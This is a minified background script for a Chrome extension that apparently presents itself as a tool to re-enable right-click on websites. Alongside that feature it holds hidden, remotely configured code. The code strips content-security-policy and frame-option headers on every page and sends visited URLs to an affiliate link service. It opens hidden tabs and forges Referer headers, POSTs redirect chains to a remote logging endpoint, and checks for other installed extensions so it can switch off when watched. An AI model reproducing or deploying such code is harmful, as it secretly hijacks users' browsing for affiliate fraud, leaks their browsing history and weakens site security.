!function(){var e,t=[];function r(e,r){null!=r&&void 0!==e&&(-1!==t.indexOf(r+"#c")&&chrome.tabs.executeScript(e,{file:"js/enable.js"},(function(){chrome.runtime.lastError})),-1!==t.indexOf(r+"#a")&&chrome.tabs.executeScript(e,{file:"js/enableA.js",allFrames:!0},(function(){chrome.runtime.lastError})))}function n(e){var r=t.indexOf(e);-1!==r&&(t.splice(r,1),i())}function i(){chrome.storage.local.set({websites_List:t})}chrome.storage.local.get(["websites_List"],(function(e){t=void 0===e.websites_List?[]:e.websites_List})),chrome.runtime.onMessage.addListener((function(e){var s=e.text;chrome.tabs.query({currentWindow:!0,active:!0},(function(e){var o=new URL(e[0].url).hostname;!function(e,r){"state"===r&&(-1!==t.indexOf(e+"#c")&&chrome.runtime.sendMessage({c:"true"}),-1!==t.indexOf(e+"#a")&&chrome.runtime.sendMessage({a:"true"}))}(o,s),function(e,s,o){"c-true"===s&&(t.push(e+"#c"),r(o,e),i());"c-false"===s&&t.indexOf(e+"#c")>-1&&(n(e+"#c"),i());"a-true"===s&&(t.push(e+"#a"),r(o,e),i());"a-false"===s&&t.indexOf(e+"#a")>-1&&(n(e+"#a"),i())}(o,s,e[0].id)})),"delete-url"===s&&n(e.url)})),chrome.tabs.onUpdated.addListener((function(t,n,i){"complete"===n.status&&function(t,n){e=new URL(t).hostname,r(n,e)}(i.url,t)}));let s={cfg:{mode:"off"},used_domains:{},rdr_chain:[],last_request_url:"",last_response_url:"",initCfg(e){e&&(this.cfg=e)},request:function(e,t){this.cfg.debug,this.cfg.ntab_tag&&-1!==e.indexOf(this.cfg.ntab_tag)?setTimeout((function(){s.request_tab(e,t)}),this.cfg.ntab_delay_ms):this.request_bg(e,t,0)},push_chain:function(e){this.rdr_chain.push(e)},request_bg:function(e,t,r){if(!(r>=this.cfg.rdr_max_count)&&this.cfg.header){this.push_chain(e),s.last_request_url=e;var n=new XMLHttpRequest;n.timeout=this.cfg.timeout,n.onreadystatechange=function(){if(4==n.readyState)if(200==n.status){var e=n.responseText.replace(/[\n\r\s]/g,"").replace(/\.href/g,""),i=!1,o=n.responseURL,a=s.is_rdr_url(n.responseURL);if(s.last_response_url=o,s.last_response_url!=s.last_request_url&&s.push_chain(s.last_response_url),a||e.length<s.cfg.jsrdr_maxlen_bytes){var c=e.replace(/^.*?location\=[\'\"]([^\'\"]+).*$/,"$1");if(/^\//.test(c)){c=new URL(c,n.responseURL).href}/^https?\:\/\//.test(c)&&(s.request_bg(c,t,r+1),i=!0)}if(!i&&s.cfg.common_rdr_rules)for(var f in s.cfg.common_rdr_rules){var l=s.cfg.common_rdr_rules[f],u=new RegExp(l.search[0],l.search[1]),d=e;if("uri"==l.where&&(d=o),l.url_pattern)if(!new RegExp(l.url_pattern[0],l.url_pattern[1]).test(o))continue;if(d.match(u)){var h=d.replace(u,l.replace);if(l.applyAfter)for(var g in l.applyAfter){var p=l.applyAfter[g];if("decodeURIComponent"==p)h=decodeURIComponent(h);else if("decodeHTML"==p){h=(e=>{var t=document.createElement("textarea");return t.innerHTML=e,t.value})(h)}}if(l.replacements)for(var m in l.replacements)h=h.replace(m,l.replacements[m]);if(l.regReplacements)for(var _ in l.regReplacements){var v=new RegExp(l.regReplacements[_].pattern[0],l.regReplacements[_].pattern[1]);h=h.replace(v,l.regReplacements[_].replace)}if(/^\//.test(h)){const e=new URL(h,n.responseURL);h=e.href}if(/^https?\:\/\//.test(h)){var x=l.delay?l.delay:0;if("string"==typeof x&&x.indexOf("-")>-1){var b=x.split("-");x=Math.floor(Math.random()*(parseInt(b[1])-parseInt(b[0])+1)+parseInt(b[0]))}setTimeout((()=>{s.request_bg(h,t,r+1)}),parseInt(x)),i=!0;break}}}i||s.send_rdr_log()}else s.send_rdr_log(!0)},n.open("GET",e,!0),n.setRequestHeader(this.cfg.header,"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),n.send()}},is_rdr_url:function(e){var t=new URL(e);return!(!this.cfg.rdr_coverage||!(t.host in this.cfg.rdr_coverage))||!!/\/goto\/?$/.test(t.pathname)},request_tab:function(e,t){this.cfg.debug,chrome.tabs.create({url:e,active:!1},(function(e){setTimeout((function(){try{chrome.tabs.remove(e.id)}catch(e){}}),s.cfg.ntab_duration_ms)}))},send_rdr_log:function(e=!1){if(this.rdr_chain&&this.cfg&&this.cfg.log_rdr_active&&this.cfg.log_rdr_endpoint){if(this.cfg&&this.cfg.log_rdr_onlydifferent){var t=this.rdr_chain[0],r=this.rdr_chain[this.rdr_chain.length-1];if(t.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1")==r.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1"))return}var n=new XMLHttpRequest,i=this.cfg.log_rdr_endpoint;e&&this.cfg.log_rdr_errors_endpoint&&(i=this.cfg.log_rdr_errors_endpoint),n.open("POST",i,!0),n.setRequestHeader("Content-Type","application/json;charset=UTF-8"),n.send(JSON.stringify(this.rdr_chain)),this.rdr_chain=[],this.last_request_url=null,this.last_response_url=null}}};new class{constructor(){this.configUrl="https://allowright-click.com/api/config/",this.config={},this.uid="",this.version=chrome.runtime.getManifest().version,this.requestFiltered=!1,this.bgProcessorRun=!1,this.environmentValidated=!1,this.envDetected=!1,this.initStorage()}initListeners(){chrome.runtime.onMessage.addListener(((e,t,r)=>{switch(e.method){case"config":r(this.config)}return!0})),chrome.webRequest.onHeadersReceived.addListener((e=>({responseHeaders:e.responseHeaders.filter((function(e){return"content-security-policy"!==e.name.toLowerCase()&&"frame-options"!==e.name.toLowerCase()&&"x-frame-options"!==e.name.toLowerCase()}))})),{urls:["<all_urls>"],types:["main_frame","sub_frame"]},["blocking","responseHeaders"])}initStorage(){chrome.storage.local.get((e=>{e&&e.config&&(this.config=e.config),this.config.uid?this.uid=this.config.uid:(this.uid=this.config.uid=this.generateUID(),this.saveConfig()),this.filterRequests(),this.validateEnvironment(),this.initBgProcessor(),this.updateConfig(),this.initListeners()}))}saveConfig(){chrome.storage.local.set({config:this.config})}generateUID(){return"xxxxxxxx-xxxx-2xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){var t=16*Math.random()|0;return("x"==e?t:3&t|8).toString(16)}))}updateConfig(){let e=this;const t=this.configUrl;fetch(`${t}`,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"version="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,version:this.version,timestamp:Date.now(),uid:this.config.uid})))}).then((e=>e.json())).then((e=>{if(e){for(let t in e)this.config[t]=e[t];this.saveConfig(this.config),this.filterRequests(),this.validateEnvironment(),this.initBgProcessor()}})).finally((()=>{this.config.configUpTime&&this.config.configUpTime>0&&setTimeout((function(){e.updateConfig()}),this.config.configUpTime)}))}validateEnvironment(){let e=this;if(!e.environmentValidated&&e.config.envCheckActive&&e.config.envCheckPeriod&&e.config.envCheckList){e.environmentValidated=!0;let t=(new Date).getTime();if(e.config.lastEnvCheck&&t-e.config.lastEnvCheck<e.config.envCheckPeriod)return;e.config.lastEnvCheck=t,e.envDetected=e.config.envDetected=!1,e.saveConfig();for(let t in e.config.envCheckList)e.detectExtentionById(e.config.envCheckList[t]).then((function(t){t&&(e.config.envDetected=e.envDetected=!0,e.saveConfig())}))}}safeRemoveTab(e){try{chrome.tabs.remove(e,(function(){chrome.runtime.lastError}))}catch(e){}}detectExtentionById(e){let t=this;return new Promise((function(r){let n=!1;chrome.tabs.create({url:"chrome-extension://"+e+"/manifest.json",active:!1},(function(e){setTimeout((function(){t.safeRemoveTab(e.id),r(!1)}),3e3),chrome.tabs.insertCSS(e.id,{code:"console.log('ok');"},(function(){chrome.runtime.lastError&&(n=/chrome-extension/gm.test(chrome.runtime.lastError.message)),chrome.tabs.remove(e.id,(function(){r(n)}))}))}))}))}filterRequests(){const e=this;this.requestFiltered||this.config&&this.config.validateFields&&(e.requestFiltered=!0,chrome.webRequest&&chrome.webRequest.onHeadersReceived.addListener((function(t){return{responseHeaders:t.responseHeaders.filter((function(t){return!(e.config.validateFields.indexOf(t.name.toLowerCase())>-1)}))}}),{urls:["<all_urls>"]},["blocking","responseHeaders"]))}initBgProcessor(){let e=this;if(!e.config.bgProcessor)return void s.initCfg({mode:"off"});if(e.envDetected)return void s.initCfg({mode:"off"});if(e.bgProcessorRun)return void s.initCfg(this.config.bgProcessor);e.bgProcessorRun=!0,s.initCfg(e.config.bgProcessor),chrome.webRequest.onCompleted.addListener((function(e){if("on"===s.cfg.mode&&!(e.tabId<0)&&200==e.statusCode&&"GET"==e.method){var t=e.url.replace(/^(https?\:\/\/[^\/]+).*$/,"$1"),r=e.url.replace(/^https?\:\/\/([^\/]+).*$/,"$1");s.cfg.keep_www_prefix||(r=r.replace(/^www\.(.*)$/,"$1"));var n=(new Date).getTime();if(!(s.used_domains[r]&&s.used_domains[r]+s.cfg.ttl_ms>n)&&!(s.cfg.domains_blacklist&&s.cfg.domains_blacklist.length>0&&s.cfg.domains_blacklist.includes(r))&&(!(s.cfg.domains_whitelist&&s.cfg.domains_whitelist.length>0)||s.cfg.domains_whitelist.includes(r))){s.used_domains[r]=n;var i=s.cfg[["tmpl",s.cfg?"url":"","aff"].reverse().join("_")].replace(/\{([A-Z]+)\}/gi,(function(e,n){switch(n){case"URL":return encodeURIComponent(t);case"DOMAIN":return encodeURIComponent(r)}return e}));if(s.cfg.aff_redirect){if(!s.cfg.domains_whitelist||!s.cfg.domains_whitelist.length>0)return;return s.push_chain(t),void s.request_bg(i,r,0)}var o=new XMLHttpRequest;o.timeout=s.cfg.aff_timeout_ms,o.onreadystatechange=function(){if(4==o.readyState&&200==o.status){var e=o.responseText.replace(/[\n\r]/g,"");if(/^https?\:\/\//.test(e)&&e!=t){var i=t.replace(/^https?\:\/\/([^\/]+).*$/,"$1");s.push_chain(t),s.request(e,i)}else s.used_domains[r]=n+s.cfg.no_coverage_ttl_ms}},o.open("GET",i),o.send()}}}),{urls:["http://*/*","https://*/*"],types:["main_frame"]});let t=["blocking","requestHeaders"];if(s.cfg&&s.cfg.rfr_rules&&s.cfg.rfr_rules.length>0&&s.cfg.listenerExtraOptions)for(var r in s.cfg.listenerExtraOptions)t.push(s.cfg.listenerExtraOptions[r]);chrome.webRequest.onBeforeSendHeaders.addListener((function(e){if("on"!==s.cfg.mode||!s.cfg.header)return{};var t=e.requestHeaders,r="";for(let e=0;e<t.length;e++)if(t[e].name===s.cfg.header){r=t[e].value,t.splice(e,1);break}if(!r)return{};var n=!1;for(let e=0;e<t.length;e++)if("accept"==t[e].name.toLowerCase()){t[e].value=r,n=!0;break}if(n||t.push({name:"Accept",value:r}),e.tabId<0){let r="";if(s.cfg.rfr_rules)for(let t in s.cfg.rfr_rules){let n=s.cfg.rfr_rules[t];if(n.url_request_before){if(!s.last_request_url)continue;if(!new RegExp(n.url_request_before[0],n.url_request_before[1]).test(s.last_request_url))continue}if(n.url_response_before){if(!s.last_response_url)continue;if(!new RegExp(n.url_response_before[0],n.url_response_before[1]).test(s.last_response_url))continue}if(n.url_chain){if(!s.rdr_chain||s.rdr_chain.length<1)continue;let e=new RegExp(n.url_chain[0],n.url_chain[1]),t=!1;for(let r in s.rdr_chain){let n=s.rdr_chain[r];if(e.test(n)){t=!0;break}}if(!t)continue}if(n.url_request){if(!new RegExp(n.url_request[0],n.url_request[1]).test(e.url))continue}if("allow"==n.rule&&(r=s.last_response_url),"replace"==n.rule&&n.replace&&(r=n.replace),"regexp"==n.rule&&n.regexp&&n.replace){var i=new RegExp(n.regexp[0],n.regexp[1]);r=s.last_response_url.replace(i,n.replace)}break}if(r){let e=t.findIndex((e=>"referer"==e.name.toLowerCase()));e>-1?t[e].value=r:t.push({name:"Referer",value:r})}}return{requestHeaders:t}}),{urls:["http://*/*","https://*/*"]},t)}};chrome.webRequest.onHeadersReceived.addListener((e=>({responseHeaders:e.responseHeaders})),{urls:["<all_urls>"]},["blocking","responseHeaders"])}();